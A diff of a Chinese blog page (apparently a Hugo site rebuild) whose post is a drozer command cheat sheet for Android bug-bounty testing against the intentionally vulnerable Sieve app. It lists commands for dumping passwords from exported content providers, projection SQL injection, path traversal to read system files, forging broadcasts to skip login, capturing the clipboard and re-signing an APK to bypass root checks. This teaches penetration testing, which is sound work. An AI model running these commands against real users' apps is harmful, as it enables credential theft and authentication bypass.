@@ -5,6 +5,9 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
 
     <title>如何挖掘SRC漏洞平台移动端Android漏洞技巧和教程 | 码中春秋&#39;s Blog</title>
     <meta property="og:title" content="如何挖掘SRC漏洞平台移动端Android漏洞技巧和教程 - 码中春秋&#39;s Blog">
@@ -20,15 +23,16 @@
         
     <meta name="author" content="码中春秋">
     <meta property="og:url" content="https://blog.taielab.com/2020-09-09/src-bugbounty-andorid.html">
-    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href='/favicon.ico'  type="image/x-icon">
 
     <link rel="stylesheet" href='/css/normalize.css'>
     <link rel="stylesheet" href='/css/style.css'>
-    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 
     
-
-
+    
+    
+    
     
     
         <link rel="stylesheet" href='/css/douban.css'>
@@ -36,7 +40,6 @@
         <link rel="stylesheet" href='/css/other.css'>
     
 </head>
-
 
 <body>
     <header id="header" class="clearfix">
@@ -54,7 +57,7 @@
                 <nav id="nav-menu" class="clearfix">
                     <a class="current" href="https://blog.taielab.com">首页</a>
                     
-                    <a  href="https://blog.taielab.com/archives/" title="存档">存档</a>
+                    <a  href="https://blog.taielab.com/archives/" title="归档">归档</a>
                     
                     <a  href="https://blog.taielab.com/about/" title="关于">关于</a>
                     
@@ -160,8 +163,8 @@
         var postToc = $(".post-toc");
         if (postToc.length) {
             var leftPos = $("#main").offset().left;
-            if(leftPos<220){
-                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            if (leftPos < 220) {
+                postToc.css({ "width": leftPos - 10, "margin-left": (0 - leftPos) })
             }
 
             var t = postToc.offset().top - 20,
@@ -180,6 +183,10 @@
                 e < t ? postToc.css(a.start) : postToc.css(a.process)
             })
         }
+
+        if ($("#TableOfContents").children().length < 1) {
+            $(".post-toc").remove();
+        }
     })
 </script>
     <article class="post">
@@ -193,7 +200,7 @@
         <div class="post-meta">
             <span>|</span>
             
-            <span class="meta-category"><a href='https://blog.taielab.com/categories/Android%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8'>Android应用逆向与安全</a></span>
+            <span class="meta-category"><a href='/categories/Android%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8'>Android应用逆向与安全</a></span>
             
         </div>
         
@@ -218,92 +225,91 @@
 <p>这些命令根据它们的作用被分为不同的类别。</p>
 <h1 id="基础知识">基础知识</h1>
 <h2 id="要查找已安装的应用程序的软件包名称">要查找已安装的应用程序的软件包名称</h2>
-<pre><code>dz&gt; run app.pack.list -f Sieve
-
+<pre tabindex="0"><code>dz&gt; run app.pack.list -f Sieve
 </code></pre><h2 id="获取应用程序的清单">获取应用程序的清单</h2>
-<pre><code>dz&gt; run app.package.manifest com.mwr.example.sieve
+<pre tabindex="0"><code>dz&gt; run app.package.manifest com.mwr.example.sieve
 </code></pre><h2 id="获取攻击面">获取攻击面</h2>
-<pre><code>dz&gt; run app.package.attacksurface com.mwr.example.sieve
+<pre tabindex="0"><code>dz&gt; run app.package.attacksurface com.mwr.example.sieve
 </code></pre><h2 id="检查可导出的活动">检查可导出的活动</h2>
-<pre><code>dz&gt; run app.activity.info -a com.mwr.example.sieve
+<pre tabindex="0"><code>dz&gt; run app.activity.info -a com.mwr.example.sieve
 </code></pre><h2 id="检查launchintent主要活动">检查launchintent(主要活动)</h2>
-<pre><code>dz&gt; run app.pack.launchintent com.mwr.example.sieve
+<pre tabindex="0"><code>dz&gt; run app.pack.launchintent com.mwr.example.sieve
 </code></pre><h2 id="调用可导出的活动">调用可导出的活动</h2>
-<pre><code>dz&gt; run app.activity.start --component &lt;package_name&gt; &lt;full_activity_name&gt;
+<pre tabindex="0"><code>dz&gt; run app.activity.start --component &lt;package_name&gt; &lt;full_activity_name&gt;
 </code></pre><h2 id="检查导出的内容提供商">检查导出的内容提供商</h2>
-<pre><code>dz&gt; run app.provider.info -a com.mwr.example.sieve
+<pre tabindex="0"><code>dz&gt; run app.provider.info -a com.mwr.example.sieve
 </code></pre><h2 id="查找内容uri">查找内容URI</h2>
-<pre><code>dz&gt; run app.provider.finduri com.mwr.example.sieve
+<pre tabindex="0"><code>dz&gt; run app.provider.finduri com.mwr.example.sieve
 </code></pre><h2 id="如果在导出的内容提供者中找到了uri路径那么使用下面的命令运行该路径以找到有用的数据在筛选中所有的密码都被转储">如果在导出的内容提供者中找到了URI路径，那么使用下面的命令运行该路径以找到有用的数据，（在筛选中，所有的密码都被转储）。</h2>
-<pre><code>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/passwords
+<pre tabindex="0"><code>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/passwords
 </code></pre><h2 id="在内容提供者数据库中插入条目">在内容提供者数据库中插入条目</h2>
-<pre><code>dz&gt; run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/passwords --integer _id 3 --string service Facebook --string username tyrone --string password zA76WR9mURDNNEw4TUiidVKRuKLEamg5h84T --string email tyrone@gmail.com
+<pre tabindex="0"><code>dz&gt; run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/passwords --integer _id 3 --string service Facebook --string username tyrone --string password zA76WR9mURDNNEw4TUiidVKRuKLEamg5h84T --string email tyrone@gmail.com
 </code></pre><h2 id="查找具有特定权限的应用程序">查找具有特定权限的应用程序</h2>
-<pre><code>dz&gt; run app.package.list -p android.permission.INSTALL_PACKAGES
+<pre tabindex="0"><code>dz&gt; run app.package.list -p android.permission.INSTALL_PACKAGES
 </code></pre><h2 id="查找以特定uid运行的应用程序在本例中系统">查找以特定UID运行的应用程序，在本例中，系统</h2>
-<pre><code>dz&gt; run app.package.list -u 1000
+<pre tabindex="0"><code>dz&gt; run app.package.list -u 1000
 </code></pre><h2 id="寻找查看特定mime类型的应用程序">寻找查看特定mime类型的应用程序</h2>
-<pre><code>dz&gt; run app.activity.forintent --action android.intent.action.view --mimetype application/pdf
+<pre tabindex="0"><code>dz&gt; run app.activity.forintent --action android.intent.action.view --mimetype application/pdf
 </code></pre><h2 id="查找设备上所有可浏览的活动">查找设备上所有可浏览的活动</h2>
-<pre><code>dz&gt; run scanner.activity.browsable
+<pre tabindex="0"><code>dz&gt; run scanner.activity.browsable
 </code></pre><blockquote>
 <p>提示</p>
 </blockquote>
 <p>要找到启动活动的名称，请检查应用程序的manifest或使用drozer中的app.package.launchintent模块。你也可以使用theapp.activity.start模块从drozer启动主活动。
-通过 **(((android:targetActivity)))=&rdquo;.someactivity&rdquo;**来寻找代理活动。
+通过 **(((android:targetActivity)))=&quot;.someactivity&quot;**来寻找代理活动。
 搜索filterTouchesWhenObscured来查找是否容易被tapjacking。
 尝试访问/Keys/而不是/Keys，它有时会绕过内容URI的模式匹配。</p>
 <h1 id="sqli漏洞">SQLi漏洞</h1>
 <p>SQLi关于使用projection参数连接到DB的内容提供者的问题。</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection <span style="color:#d14">&#34;&#39;&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection <span style="color:#d14">&#34;&#39;&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在内容提供商上自动执行SQLi</p>
-<pre><code>dz&gt; run scanner.provider.sqltables -a content://com.mwr.example.sieve.DBContentProvider/passwords
+<pre tabindex="0"><code>dz&gt; run scanner.provider.sqltables -a content://com.mwr.example.sieve.DBContentProvider/passwords
 </code></pre><p>用于启动本地主机服务器以显示内容提供者和运行类似sqlmap的工具。</p>
-<pre><code>dz&gt; run auxiliary.webcontentresolver -p 9999
+<pre tabindex="0"><code>dz&gt; run auxiliary.webcontentresolver -p 9999
 </code></pre><p>对设备上的所有内容提供商进行自动SQLi扫描。</p>
-<pre><code>dz&gt; run scanner.provider.injection
+<pre tabindex="0"><code>dz&gt; run scanner.provider.injection
 </code></pre><h1 id="遍历">遍历</h1>
 <p>使用内容提供者读取外部文件</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/system/etc/hosts
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/system/etc/hosts
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在目录中遍历/筛选数据库</p>
-<pre><code>&gt;dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/system/etc/hosts。
+<pre tabindex="0"><code>&gt;dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/system/etc/hosts。
 </code></pre><p>自动遍历</p>
-<pre><code>&gt;dz&gt; run scanner.provider.traversal -a content://com.mwr.example.sieve.FileBackupProvider
+<pre tabindex="0"><code>&gt;dz&gt; run scanner.provider.traversal -a content://com.mwr.example.sieve.FileBackupProvider
 </code></pre><blockquote>
 <p>可供阅读：https://www.sh4ka.fr/android/galaxys3/from_0perm_to_INSTALL_PACKAGES_on_galaxy_S3.html#_tl_dr</p>
 </blockquote>
 <h1 id="利用服务">利用服务</h1>
 <p>获取服务</p>
-<pre><code>dz&gt; run app.service.info -a com.mwr.example.sieve。
+<pre tabindex="0"><code>dz&gt; run app.service.info -a com.mwr.example.sieve。
 </code></pre><p>在sieve中利用handleMessage()函数(AuthService服务的代码分析)</p>
-<pre><code>dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 1337 --bundle-as-obj。
+<pre tabindex="0"><code>dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 1337 --bundle-as-obj。
 </code></pre><p>在上述要求中，PIN 1337可以被强制执行</p>
 <p>利用CryptoService加密一个消息</p>
-<pre><code>dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService --msg 3452 2 3 --extra string com.mwr.example.sieve.KEY testpassword --extra string com.mwr.example.sieve.STRING &quot;string to be encrypted&quot; --bundle-as-obj
+<pre tabindex="0"><code>dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService --msg 3452 2 3 --extra string com.mwr.example.sieve.KEY testpassword --extra string com.mwr.example.sieve.STRING &#34;string to be encrypted&#34; --bundle-as-obj
 </code></pre><p>在&ndash;msg中传递的参数是额外参数。分析代码，使用其中提到的参数，并增加额外的参数，直到完成3个参数。&ndash;msg期望有三个参数。</p>
 <h1 id="利用广播接收器">利用广播接收器</h1>
 <p>获取广播接收器</p>
-<pre><code>dz&gt; run app.broadcast.info -a com.mwr.example.browser
+<pre tabindex="0"><code>dz&gt; run app.broadcast.info -a com.mwr.example.browser
 </code></pre><p>如果一个应用程序希望广播接收器能够捕捉到一个意图，然后显示经过认证的活动，该广播的生成只有在登录后才有可能。但经过代码审查，攻击者可以使用drozer手动发送该意图。
 广播接收器的样本。</p>
-<pre><code>&lt;receiver android:name=&quot;.LoginReceiver&quot;
-android:exported=&quot;true&quot;&gt;
+<pre tabindex="0"><code>&lt;receiver android:name=&#34;.LoginReceiver&#34;
+android:exported=&#34;true&#34;&gt;
 &lt;intent-filter&gt;
-&lt;action android:name=&quot;com.myapp.CORRECT_CREDS&quot; /&gt;
+&lt;action android:name=&#34;com.myapp.CORRECT_CREDS&#34; /&gt;
 &lt;/intent-filter&gt;
 &lt;/receiver&gt;
 
@@ -311,34 +317,33 @@ android:exported=&quot;true&quot;&gt;
 dz&gt; run app.broadcast.send --action com.myapp.CORRECT_CREDS
 (Page 217 - MAHH)
 </code></pre><p>意图嗅探/使用广播接收器捕捉意图，而这些意图是为其他广播接收器准备的。</p>
-<pre><code>dz&gt; run app.broadcast.sniff --action  android.intent.action.BATTERY_CHANGED
+<pre tabindex="0"><code>dz&gt; run app.broadcast.sniff --action  android.intent.action.BATTERY_CHANGED
 
 dz&gt; run app.broadcast.sniff --action com.myapp.USER_LOGIN (发送广播的动作名称)
 </code></pre><h1 id="其他命令">其他命令</h1>
 <p>使用drozer模块查找WebView是否可被利用。</p>
-<pre><code>dz&gt; run scanner.misc.checkjavascriptbridge -a com.vulnerable.js
-
+<pre tabindex="0"><code>dz&gt; run scanner.misc.checkjavascriptbridge -a com.vulnerable.js
 </code></pre><blockquote>
 <p>漏洞案例: <a href="https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/">https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/</a></p>
 </blockquote>
 <p>从剪贴板查看复制的文本</p>
-<pre><code>dz&gt; run post.capture.clipboard
+<pre tabindex="0"><code>dz&gt; run post.capture.clipboard
 </code></pre><p>查找应用程序是否允许其数据备份</p>
-<pre><code>dz&gt; run app.pack.backup -f com.mwr.example.sieve
+<pre tabindex="0"><code>dz&gt; run app.pack.backup -f com.mwr.example.sieve
 </code></pre><p>找出一个包是否可以调试。</p>
-<pre><code>dz&gt; run app.pack.debuggable -f sieve
+<pre tabindex="0"><code>dz&gt; run app.pack.debuggable -f sieve
 </code></pre><p>如果可以调试，你可以以该程序的身份运行命令。</p>
-<pre><code>shell@android:/ $ run-as com.mwr.example.sieve
+<pre tabindex="0"><code>shell@android:/ $ run-as com.mwr.example.sieve
 </code></pre><h1 id="反编译编译签名apk">反编译/编译/签名apk</h1>
 <p>使用apktool将app转换为baksmali。</p>
-<pre><code>$ java -jar apktool.jar d com.joeykrim.rootcheck.apk rootcheck
+<pre tabindex="0"><code>$ java -jar apktool.jar d com.joeykrim.rootcheck.apk rootcheck
 </code></pre><p>然后用grep查找类似 &ldquo;su &ldquo;这样的字符串来绕过root检查（发挥你的想象力）。</p>
 <p>再次编译应用程序。</p>
-<pre><code>$ java -jar apktool.jar b rootcheck/ rootcheck-modified.apk
+<pre tabindex="0"><code>$ java -jar apktool.jar b rootcheck/ rootcheck-modified.apk
 </code></pre><p>对apk进行签名。</p>
-<pre><code>$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystoremykey.keystore rootcheck-modified.apk alias_name.
+<pre tabindex="0"><code>$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystoremykey.keystore rootcheck-modified.apk alias_name.
 </code></pre><p>注：使用jarsigner v1.6，用以下方法改变版本。</p>
-<pre><code>$ sudo update-alternatives --config jarsigner
+<pre tabindex="0"><code>$ sudo update-alternatives --config jarsigner
 </code></pre><h1 id="其他技巧">其他技巧</h1>
 <p>在源代码中寻找openOrCreateDatabase()函数，它是SQLCipher用来存储密钥来加密DB的。</p>
 <p>SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(databaseFile, &ldquo;test123&rdquo;, null)。</p>
@@ -391,22 +396,41 @@ dz&gt; run app.broadcast.sniff --action com.myapp.USER_LOGIN (发送广播的动
             
             <ul class="clearfix">
                 
-                <li><a href='https://blog.taielab.com/tags/Android'>Android</a></li>
+                <li><a href='/tags/Android'>Android</a></li>
                 
-                <li><a href='https://blog.taielab.com/tags/drozer'>drozer</a></li>
+                <li><a href='/tags/drozer'>drozer</a></li>
                 
             </ul>
             
         </div>
     </article>
     
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
     
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
 
     
     
     <div class="post bg-white">
       <script src="https://utteranc.es/client.js"
-            repo= "udpsec/blog-comments"
+            repo= "taielab"
             issue-term="pathname"
             theme="github-light"
             crossorigin="anonymous"
@@ -414,13 +438,47 @@ dz&gt; run app.broadcast.sniff --action com.myapp.USER_LOGIN (发送广播的动
       </script>
     </div>
     
+    
+    
+
 </div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2022 <a href="https://blog.taielab.com">码中春秋&#39;s Blog By 码中春秋</a>
+        
+    </div>
+    <br />
+
+</footer>
+
+
+    
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+    <script src='/js/douban.js'></script>
 
                 </div>
 
                 <div id="secondary">
     <section class="widget">
-        <form id="search" action='https://blog.taielab.com/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+        <form id="search" action='https://blog.taielab.com/search' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
       
       <input type="text" name="q" maxlength="20" placeholder="Search">
       <input type="hidden" name="sitesearch" value="https://blog.taielab.com">
@@ -488,28 +546,12 @@ dz&gt; run app.broadcast.sniff --action com.myapp.USER_LOGIN (发送广播的动
             </a>
         </li>
         
-        <li>
-            <a href="" title="" target="_blank" style="color:red">
-                
-                    
-                
-            </a>
-        </li>
-        
-        <li>
-            <a href="" title="" target="_blank" style="color:red">
-                
-                    
-                
-            </a>
-        </li>
-        
     </ul>
 </section>
 
 
     <section class="widget">
-        <h3 class="widget-title">分类</h3>
+        <h3 class="widget-title"><a href='/categories/'>分类</a></h3>
 <ul class="widget-list">
     
     <li><a href="https://blog.taielab.com/categories/Android%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/">Android应用逆向与安全 (1)</a></li>
@@ -548,7 +590,7 @@ dz&gt; run app.broadcast.sniff --action com.myapp.USER_LOGIN (发送广播的动
     </section>
 
     <section class="widget">
-        <h3 class="widget-title">标签</h3>
+        <h3 class="widget-title"><a href='/tags/'>标签</a></h3>
 <div class="tagcloud">
     
     <a href="https://blog.taielab.com/tags/Android/">Android</a>
@@ -628,7 +670,7 @@ dz&gt; run app.broadcast.sniff --action com.myapp.USER_LOGIN (发送广播的动
     <ul class="widget-list">
         
         <li>
-            <a target="_blank" href="#" title=""></a>
+            <a target="_blank" href="" title=""></a>
         </li>
         
     </ul>
@@ -645,51 +687,6 @@ dz&gt; run app.broadcast.sniff --action com.myapp.USER_LOGIN (发送广播的动
             </div>
         </div>
     </div>
-    <footer id="footer">
-    <div class="container">
-        &copy; 2020 <a href="https://blog.taielab.com">码中春秋&#39;s Blog By 码中春秋</a>.
-        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io" target="_blank">Hugo</a>.
-        <a href="https://www.flysnow.org/" target="_blank">Theme</a> based on <a href="https://github.com/flysnow-org/maupassant-hugo" target="_blank">maupassant</a>.
-        
-    </div>
-</footer>
-
-
-    
-    <script type="text/javascript">
-        window.MathJax = {
-            tex2jax: {
-                inlineMath: [['$', '$']],
-                processEscapes: true
-                }
-            };
-    </script>
-    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
-
-
-<a id="rocket" href="#top"></a>
-<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'GA ID', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
-
-    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
-
-
-
-
-    <script src='/js/douban.js'></script>
-
 </body>
 
 </html>
